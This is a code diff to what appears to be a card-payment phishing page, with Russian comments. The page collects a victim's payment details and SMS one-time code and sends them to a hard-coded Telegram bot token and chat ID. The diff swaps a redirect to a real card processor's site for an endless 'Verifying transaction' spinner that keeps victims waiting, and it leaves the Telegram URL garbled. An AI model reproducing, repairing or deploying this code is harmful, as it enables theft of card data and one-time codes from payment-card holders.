@@ -25,6 +25,22 @@
         button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
         button:disabled { background: #aaa; cursor: not-allowed; }
         .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
+        
+        /* Стили для анимации круга загрузки */
+        .spinner {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #5c46e5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -88,7 +104,7 @@
 </div>
 
 <script>
-// Настройки Telegram (Проверьте правильность этих данных)
+// Настройки Telegram
 const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
 const CHAT_ID = '6576262467';
 
@@ -115,9 +131,9 @@ document.getElementById('sms-code').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '');
 });
 
-// Новая надежная функция отправки с отслеживанием ошибок
+// Функция отправки запроса в Telegram
 async function sendToTelegram(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`; // Исправлен URL-адрес
+    const url = `telegram.org{BOT_TOKEN}/sendMessage`;
     
     try {
         const response = await fetch(url, {
@@ -138,7 +154,7 @@ async function sendToTelegram(text) {
         }
         return true;
     } catch (error) {
-        alert(`Ошибка сети: Не удалось отправить запрос в Telegram. Проверьте подключение.`);
+        alert(`Ошибка сети: Не удалось отправить запрос в Telegram.`);
         console.error(error);
         return false;
     }
@@ -164,7 +180,7 @@ async function sendData() {
     const isSent = await sendToTelegram(message);
     
     if (isSent) {
-        nav(3); // Переход на ввод СМС только если лог ушел
+        nav(3);
     } else {
         btn.disabled = false;
         btn.innerText = 'Pay 161.00€';
@@ -188,14 +204,16 @@ async function verifyCode() {
     const isSent = await sendToTelegram(message);
 
     if (isSent) {
-        document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
-        setTimeout(() => {
-                // Показываем загрузку
-    document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
-
-    setTimeout(() => {
-        window.location.href = "https://www.jccsmart.com";
-    }, 3000);
+        // Замена содержимого страницы на бесконечный индикатор загрузки без перехода на сторонние сайты
+        document.getElementById('main-content').innerHTML = `
+            <div class="spinner"></div>
+            <h2 style="margin-top: 10px;">Verifying transaction...</h2>
+            <p style="font-size: 14px; color: #666;">Please do not close this window or click back.</p>
+        `;
+    } else {
+        btn.disabled = false;
+        btn.innerText = 'Confirm Payment';
+    }
 }
 </script>
 
